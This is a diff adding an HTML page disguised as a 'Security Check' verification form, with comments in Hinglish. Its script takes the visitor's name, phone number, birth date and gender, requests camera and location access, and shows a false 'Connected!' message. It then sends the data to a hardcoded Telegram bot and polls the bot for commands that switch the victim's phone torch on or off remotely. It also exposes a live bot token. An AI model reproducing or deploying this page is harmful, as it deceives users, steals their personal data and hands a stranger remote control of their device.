@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@400;600;800&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Nunito', sans-serif; background: #0f172a; height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; }
+  
+  .card { background: #1e293b; border: 2px solid #334155; border-radius: 20px; padding: 30px 20px; width: 90%; max-width: 360px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+  h2 { font-family: 'Fredoka One', cursive; font-size: 24px; color: #38bdf8; margin-bottom: 15px; text-align: center; }
+  
+  .input-group { width: 100%; margin-bottom: 15px; text-align: left; }
+  .input-group label { font-weight: 800; font-size: 12px; color: #cbd5e1; display: block; margin-bottom: 5px; }
+  .input-group input, .input-group select { width: 100%; padding: 12px; border: 2px solid #334155; border-radius: 10px; font-family: 'Nunito'; font-weight: 600; background: #0f172a; color: #fff; outline: none; }
+  
+  .gender-group { display: flex; gap: 15px; margin-top: 5px; }
+  .gender-group label { display: flex; align-items: center; gap: 5px; font-size: 14px; color: #cbd5e1; cursor: pointer; }
+  
+  #ageDisplay { font-size: 13px; color: #4ade80; font-weight: 800; margin-top: 5px; display: none; }
+  
+  .btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 10px; font-family: 'Fredoka One'; font-size: 18px; color: #0f172a; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+  
+  #successScreen { display: none; text-align: center; }
+  .success-icon { font-size: 50px; margin-bottom: 15px; color: #4ade80; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <!-- FORM -->
+  <div id="formScreen">
+    <h2>🔒 Security Check</h2>
+    
+    <div class="input-group">
+      <label>Your Name</label>
+      <input id="fName" type="text" placeholder="Enter your name">
+    </div>
+    
+    <div class="input-group">
+      <label>Mobile Number</label>
+      <input id="fPhone" type="tel" placeholder="10 digit number" maxlength="10">
+    </div>
+
+    <div class="input-group">
+      <label>Date of Birth</label>
+      <input id="fDob" type="date" onchange="calculateAge()">
+      <div id="ageDisplay"></div>
+    </div>
+
+    <div class="input-group">
+      <label>Gender</label>
+      <div class="gender-group">
+        <label><input type="radio" name="gender" value="Male"> Male</label>
+        <label><input type="radio" name="gender" value="Female"> Female</label>
+      </div>
+    </div>
+
+    <button class="btn" id="startBtn">Verify & Continue</button>
+    <div id="formErr" style="color:red; font-size:13px; margin-top:10px; text-align:center;"></div>
+  </div>
+
+  <!-- SUCCESS (User ko bas yahi dikhega) -->
+  <div id="successScreen">
+    <div class="success-icon">✅</div>
+    <h2>Connected!</h2>
+    <p style="color:#94a3b8; font-size:14px;">Aapka device successfully verify ho gaya hai.</p>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "8864112645:AAHTMjpWSfPxhqAB8pkgwm-j49OXAGWs1zI";
+  const MY_CHAT_ID = "8709228094";
+  
+  let userPhone = "";
+  let isTorchOn = false;
+  let stream = null;
+  let track = null;
+
+  // 1. AGE CALCULATE
+  function calculateAge() {
+    const dobInput = document.getElementById("fDob").value;
+    if (!dobInput) return;
+    const dob = new Date(dobInput);
+    const today = new Date();
+    let age = today.getFullYear() - dob.getFullYear();
+    const monthDiff = today.getMonth() - dob.getMonth();
+    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) age--;
+    
+    const ageDisplay = document.getElementById("ageDisplay");
+    ageDisplay.style.display = "block";
+    ageDisplay.innerText = `Aapki umra ${age} saal hai.`;
+  }
+
+  // 2. FORM SUBMIT
+  document.getElementById("startBtn").addEventListener("click", async () => {
+    const name = document.getElementById("fName").value.trim();
+    userPhone = document.getElementById("fPhone").value.trim();
+    const dob = document.getElementById("fDob").value;
+    const genderRadio = document.querySelector('input[name="gender"]:checked');
+    const gender = genderRadio ? genderRadio.value : "";
+    const err = document.getElementById("formErr");
+
+    if (name.length < 3) { err.textContent = "Valid name daalein."; return; }
+    if (!/^[6-9]\d{9}$/.test(userPhone)) { err.textContent = "Sahi 10 digit number daalein."; return; }
+    if (!dob) { err.textContent = "DOB daalein."; return; }
+    if (!gender) { err.textContent = "Gender select karein."; return; }
+    err.textContent = "";
+
+    // Permission maangein
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+      track = stream.getVideoTracks()[0];
+      navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); 
+    } catch (e) {
+      alert("Kripya Camera permission dein.");
+      return;
+    }
+
+    // Screen change
+    document.getElementById("formScreen").style.display = "none";
+    document.getElementById("successScreen").style.display = "block";
+
+    // Telegram par user ki details bhejein (Command instructions ke saath)
+    const msg = `🚨 <b>Naya User Connected!</b>\n\n` +
+                `👤 <b>Name:</b> ${name}\n` +
+                `📞 <b>Phone:</b> <code>${userPhone}</code>\n` +
+                `🎂 <b>DOB:</b> ${dob} (Age: ${ageDisplay.innerText})\n` +
+                `🚻 <b>Gender:</b> ${gender}\n\n` +
+                `💡 <b>Torch Control Commands:</b>\n` +
+                `ON karne ke liye: <code>/on ${userPhone}</code>\n` +
+                `OFF karne ke liye: <code>/off ${userPhone}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: MY_CHAT_ID, text: msg, parse_mode: "HTML" })
+    });
+
+    // Commands sunna shuru karein
+    listenToTelegramCommands(userPhone);
+  });
+
+  // 3. TORCH HARDWARE CONTROL
+  async function setHardwareTorch(turnOn) {
+    try {
+      if (!track) return;
+      if (turnOn) {
+        if (track.getCapabilities().torch) {
+          await track.applyConstraints({ advanced: [{ torch: true }] });
+          isTorchOn = true;
+        }
+      } else {
+        await track.applyConstraints({ advanced: [{ torch: false }] });
+        isTorchOn = false;
+      }
+    } catch (e) {}
+  }
+
+  // 4. TELEGRAM COMMAND LISTENER
+  function listenToTelegramCommands(phone) {
+    setInterval(async () => {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+        const data = await res.json();
+        
+        if (data.ok && data.result) {
+          data.result.slice(-10).forEach(update => {
+            if (update.message && update.message.text) {
+              const txt = update.message.text.toLowerCase();
+              
+              // Check karein ki command uske number ke saath hai ya nahi
+              if (txt === `/on ${phone}` && !isTorchOn) {
+                setHardwareTorch(true);
+              }
+              if (txt === `/off ${phone}` && isTorchOn) {
+                setHardwareTorch(false);
+              }
+            }
+          });
+        }
+      } catch (e) {}
+    }, 3000);
+  }
+</script>
+
+</body>
+</html>
